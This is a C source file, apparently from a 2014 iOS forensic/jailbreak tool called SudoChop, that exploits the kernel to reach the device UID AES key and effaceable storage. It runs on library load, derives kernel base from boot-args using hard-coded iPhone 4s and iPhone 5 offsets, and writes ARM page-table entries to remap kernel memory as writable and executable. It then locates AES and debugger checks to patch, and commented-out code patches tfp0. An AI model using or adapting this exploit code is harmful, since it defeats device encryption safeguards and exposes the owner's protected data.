//
//  patch.c
//  com.sudo-sec.chop.patch
//
//  Created by Joshua Hill on 1/16/14.
//  Copyright (c) 2014 Sudo Security Group. All rights reserved.

#include <stdio.h>
#include <syslog.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <CoreFoundation/CoreFoundation.h>

#include "avio.h"
#include "find.h"
#include "patch.h"
#include "kernel.h"
#include "devtree.h"
#include "m1n0rthreat.h"

void patch_enter(void) __attribute__((constructor));
void patch_leave(void) __attribute__((destructor));

/* About:
 *   This module in SudoChop is responsiable for exploiting and patching the kernel to allow
 * to allow access to devices UID for AES encryption/decryption and access to effaceable storage
 *
 * Architecture:
 *   This uses a basic "whiteboard" architecture style. The kernel object is the whiteboard object.
 * Each "expert" knows about the interface needed for the kernel object and can add, remove, or change
 * functions and data to the kernel object.
 *
 */

void x_patch_enter() {
    syslog(LOG_ERR, "++[PATCH]++ Entering patch.dylib");
    
    syslog(LOG_ERR, "++[PATCH]++ Opening reference kernel to object");
    kernel_t* kernel = kernel_open();
    if(kernel) {
        
        
        syslog(LOG_ERR, "++[PATCH]++ Closing reference to kernel object");
        kernel_close(kernel);
        
    } else {
        syslog(LOG_ERR, "++[PATCH]++ Unable to open kernel object");
    }
    
    syslog(LOG_ERR, "++[PATCH]++ Exiting patch.dylib");
    exit(0);
}

void patch_enter() {
    syslog(LOG_ERR, "++[PATCH]++ Entering patch.dylib");
    
    syslog(LOG_ERR, "++[PATCH]++ Opening reference kernel to object");
    kernel_t* kernel = kernel_open();
    if(kernel) {
        // Let's do this shit!!
        vm_address_t bootargs = devtree_get_bootargs(kernel);
        syslog(LOG_ERR, "++[PATCH]++ Found boot-args at 0x%08lx", bootargs);
        
        vm_address_t pagemap = 0;
        vm_address_t kernbase = 0;
        if(kernel->task) {
            kernbase = kernel->base;
            if(kernbase) {
                syslog(LOG_ERR, "++[PATCH]++ Found kernbase at 0x%08lx", kernbase);
            }
            pagemap = kernel->get(find_tlb(kernel));
            if(pagemap) {
                syslog(LOG_ERR, "++[PATCH]++ Found pagemap at 0x%08lx", pagemap);
            }
            //m1n0rthreat_init(kernbase);
        
        } else {
            // iPhone4s 6.1.3 = 0xDBB000
            //kernbase = bootargs - 0xDBB000;
            // iPhone5 7.0.6
            //kernbase = bootargs - 0xF0D000;
            // iPhone5 7.0.4
            kernbase = bootargs - 0xF0E000;
            // Test Offset
            //kernbase = 0x0;
            syslog(LOG_ERR, "++[PATCH]++ I think kernbase should be at 0x%08lx", kernbase);
            
            // iPhone4s 6.1.3 = 0x8000
            //pagemap = bootargs + 0x8000; // PAGEMAP_OFFSET
            // iPhone5 7.0.6
            //pagemap = bootargs + 0x6000; // PAGEMAP_OFFSET
            // iPhone5 7.0.4
            pagemap = bootargs + 0x6000;
            // Test Offset
            //pagemap = bootargs = 0x0;
            syslog(LOG_ERR, "++[PATCH]++ I think the page mappings should be at 0x%08lx", pagemap);
            
            //m1n0rthreat_init(kernbase); // BOOTARG_OFFSET
            //printuuid();
            //m1n0rthreat_kernel_write(kernbase+KERN_UUID, "p0sixninja\0", sizeof("p0sixninja")+1);
            //printuuid();
            //exit(1);
        }
        
        unsigned int ttb[] = {
            0x80010C02,
            0x80110C02,
            0x80210C02,
            0x80310C02,
            0x80410C02,
            0x80510C02,
            0x80610C02,
            0x80710C02,
            0x80810C02,
            0x80910C02,
            0x80A10C02,
            0x80B10C02,
            0x80C10C02,
            0x80D10C02,
            0x80E10C02,
            0x80F10C02,
        };
        
        unsigned int* feedface = (unsigned int*)(SHADOWMAP_BEGIN+0x1000);
        //m1n0rthreat_kernel_write(pagemap+TTB_OFFSET(SHADOWMAP_BEGIN), ttb, sizeof(ttb));
        //avio_kernel_write(pagemap+TTB_OFFSET(SHADOWMAP_BEGIN), ttb, sizeof(ttb));
        avio_kernel_set(pagemap+TTB_OFFSET(SHADOWMAP_BEGIN), ttb[0]);
        
        
        syslog(LOG_ERR, "++[PATCH]++ Kernel should be remapped as RWX 0x%08x", SHADOWMAP_BEGIN);
        
        uint8_t* kmem = SHADOWMAP_BEGIN;
        syslog(LOG_ERR, "++[PATCH]++ Please be 0xFEEDFACE.... 0x%08x", *feedface);
        if(*feedface == 0xfeedface) {
            syslog(LOG_ERR, "++[PATCH]++ Success!! Now let's find those patches");
            
            uint32_t iolog = find_IOLog(kernbase, SHADOWMAP_BEGIN, SHADOWMAP_SIZE_BYTES);
            if(iolog) {
                syslog(LOG_ERR, "Found IOLog at 0x%08x", iolog);
            }

            uint32_t aes = find_aes(kernbase, SHADOWMAP_BEGIN, SHADOWMAP_SIZE_BYTES);
            if(aes) {
                syslog(LOG_ERR, "Found AES at 0x%08x", aes);
                //*((unsigned int*)&kmem[aes]) = 0x0;
            }
            
            //uint32_t dbg1 = find_i_can_has_debugger_1(kernbase, SHADOWMAP_BEGIN, SHADOWMAP_SIZE_BYTES);
            //if(dbg1) {
            //    syslog(LOG_ERR, "Found DBG1 at 0x%08x", dbg1);
            //    *((unsigned char*)&kmem[dbg1]) = 0x1;
            //    kmem[dbg1] = 0x1;
            //}
            
            //uint32_t dbg2 = find_i_can_has_debugger_2(kernbase, SHADOWMAP_BEGIN, SHADOWMAP_SIZE_BYTES);
            //if(dbg2) {
            //    syslog(LOG_ERR, "Found DBG2 at 0x%08x", dbg2);
            //    //*((unsigned char*)&kmem[dbg2]) = 0x1;
            //    kmem[dbg2] = 0x1;
            //}
            
        } else {
            syslog(LOG_ERR, "++[PATCH]++ Fail... Check offsets again...");
        }
        
        
        syslog(LOG_ERR, "++[PATCH]++ Closing reference to kernel object");
        kernel_close(kernel);
        
    } else {
        syslog(LOG_ERR, "++[PATCH]++ Unable to open kernel object");
    }

    syslog(LOG_ERR, "++[PATCH]++ Exiting patch.dylib");
    exit(0);
}
 

/*
void patch_enter() {
    syslog(LOG_ERR, "++[PATCH]++ Entering patch.dylib");
    
    syslog(LOG_ERR, "++[PATCH]++ Opening reference kernel to object");
    kernel_t* kernel = kernel_open();
    if(kernel) {
        // Should all this be rolled into the kernel object, seems silly to worry about it here
        syslog(LOG_ERR, "++[PATCH]++ Kernel object created successfully");
        if(kernel->task == 0) {
            
            // No tfp0 patch, let's patch it
            syslog(LOG_ERR, "++[PATCH]++ No tfp0 patch found, attempting to find it");
            vm_address_t tfp_addr = 0;//find_tfp(kernel);
            if(tfp_addr) {
                syslog(LOG_ERR, "++[PATCH]++ Found tfp0 patch at 0x%lx", tfp_addr);
                syslog(LOG_ERR, "++[PATCH]++ Patching the kernel page containing tfp0 function");
                patch_tlb(kernel, tfp_addr);
                // TODO: Need a way to flush this!!!
                patch_tfp(kernel);
                // TODO: Check return value?
                syslog(LOG_ERR, "++[PATCH]++ tfp0 patch should now be applied at %lx", tfp_addr);
                
            } else {
                syslog(LOG_ERR, "++[PATCH]++ Unable to locate tfp0 patch");
                kernel_close(kernel);
                // Could we continue with just the kernel exploit?
                return;
            }
            
            // Re-open kernel so we're using tfp0 now
            syslog(LOG_ERR, "++[PATCH]++ Re-opening kernel object to use tfp0 now");
            kernel_close(kernel);
            kernel = kernel_open();
            if(kernel) {
                if(kernel->task == 0) {
                    // If we still failed then we didn't patch tfp0 successfully (or it didn't flush)
                    syslog(LOG_ERR, "++[PATCH]++ Error patching tfp0 or need to flush cache");
                    // Could we continue with just the kernel exploit?
                    kernel_close(kernel);
                    return;
                    
                } else {
                    syslog(LOG_ERR, "++[PATCH]++ tfp0 successfully patched");
                }
            }
            
        } else {
            // Looks like tfp0 was already patched
            syslog(LOG_ERR, "++[PATCH]++ tfp0 was already patched is this device jailbroken?");
        }
        
        patch_aes(kernel);
        
        // TODO: Check to make sure these succeessful
        // Flush
        //patch_dbg(kernel);
        // Flush
        
        kernel_close(kernel);
    } else {
        syslog(LOG_ERR, "++[PATCH]++ Unable to open kernel object");
    }
    
    exit(0);
}
*/

void patch_leave() {
    syslog(LOG_ERR, "++[PATCH]++ Leaving patch.dylib");
}

int patch_tfp(kernel_t* kernel) {
    return 0;
}

/*
int patch_aes(kernel_t* kernel) {
    vm_address_t aes_addr = find_aes(kernel);
    if(aes_addr) {
        syslog(LOG_ERR, "Found AES patch address at 0x%lx", aes_addr);
        
        // Make sure this kernel page is set RWX
        patch_tlb(kernel, aes_addr);
        
        // We just NOP out this branch after the check
        kernel->set(aes_addr, 0x0);
        
    } else {
        syslog(LOG_ERR, "Unable to find AES patch address");
        return -1;
    }
    return 0;
}
 */

int patch_dbg(kernel_t* kernel) {
    return 0;
}

int patch_iof(kernel_t* kernel) {
    return 0;
}

int patch_tlb(kernel_t* kernel, vm_address_t target) {
    syslog(LOG_ERR, "Pwning TLB!!!");
    if(kernel->pmap == 0) {
        kernel->pmap = find_tlb(kernel);
    }
    
    vm_address_t base = kernel->base;
    vm_address_t addr = kernel->pmap;
    vm_address_t ttb_virt = kernel->get(addr);
    vm_address_t ttb_phys = kernel->get(addr + sizeof(vm_address_t));
    syslog(LOG_ERR, "kernel_pmap->ttb_virt *0x%08x = 0x%08x\n", addr, ttb_virt);
    syslog(LOG_ERR, "kernel_pmap->ttb_phys *0x%08x = 0x%08x\n", addr + sizeof(vm_address_t), ttb_phys);
    
    vm_address_t start = ADDR_TO_TTE(ttb_virt, target);
    vm_address_t desc = kernel->get(start);
    
    syslog(LOG_ERR, "offset page map (L1): *0x%08x = 0x%08x\n", start, desc);
    
    // get the page table
    vm_address_t pte = (desc & 0xfffffc00); // physical
    pte -= ttb_phys & 0xF0000000;  // physBase
    pte += base - 0x1000;
    
    // Virt offset
    pte += PTE_OFFSET(target);
    desc = kernel->get(pte);
    
    // Or bits.
    syslog(LOG_ERR, "offset page map (L2): *0x%08x = 0x%08x\n", pte, desc);
    desc &= ~(1 << 9);      // APX-bit;
    desc |= (1 << 5);       // AP bit
    desc |= (1 << 4);       // AP-bit
    syslog(LOG_ERR, "offset page map (L2): *0x%08x = 0x%08x\n", pte, desc);
    
    kernel->set(pte, desc);
    
    return 0;
}
